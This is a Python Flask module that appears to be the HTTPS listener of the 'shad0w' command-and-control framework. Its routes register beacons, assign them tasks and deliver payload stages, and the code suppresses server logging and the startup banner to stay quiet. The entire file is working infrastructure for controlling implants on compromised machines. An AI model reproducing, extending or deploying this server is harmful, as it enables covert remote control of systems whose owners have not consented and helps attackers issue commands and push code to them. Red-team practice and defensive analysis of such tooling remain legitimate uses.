import sys
import logging

from .path_handler import Handler

from OpenSSL import SSL
from flask import Flask, request, jsonify

app = Flask(__name__)

# shut flask output up
log                    = logging.getLogger('werkzeug')
log.disabled           = True
cli                    = sys.modules['flask.cli']
cli.show_server_banner = lambda *x: None

IGNORE_CONTENT = ""

@app.before_request
def log_request():
    # this will show every request that the flask server gets

    # shad0w.debug.log(request)

    # do nothin jus return
    return None

@app.route("/")
def web_blank_page():
    # this page should never be hit by a legit beacon
    # so if its hit dont do anything
    shad0w.debug.log("HTTP - '/' was hit")

    return phandle.blank_page()

@app.route("/register", methods=["GET", "POST"])
def web_register_beacon():
    # register the beacon

    shad0w.debug.log("HTTP - '/register' was hit, attempting to register")

    # just give it the request so it can pull stuff out itsself
    return phandle.register_beacon(request)

@app.route("/tasks", methods=["GET", "POST"])
def web_task_beacon():
    # register a task on a beacon

    return phandle.task_beacon(request)

@app.route("/stage", methods=["GET", "POST"])
def web_stage_beacon():
    # send the requested stage to a beacon

    return phandle.stage_beacon(request)


def run_serv(*args):
    # cant think of a better way doing this so guess i gotta use globals
    global shad0w, phandle
    shad0w  = args[0]

    phandle = Handler(shad0w)

    shad0w.debug.log("starting flask http server")
    shad0w.debug.log(f"Starting HTTPS server ({shad0w.addr[0]}:{shad0w.addr[1]})", log=True)

    shad0w.debug.log(f"creating ssl context with {shad0w.sslkey} & {shad0w.sslcrt}")

    try:
        app.run(host=shad0w.addr[0], port=shad0w.addr[1], ssl_context=(shad0w.sslcrt, shad0w.sslkey))
    except FileNotFoundError:
        shad0w.debug.error(f"Unable to find cert: {shad0w.sslcrt} or private key: {shad0w.sslkey}. You should exit.")
        return
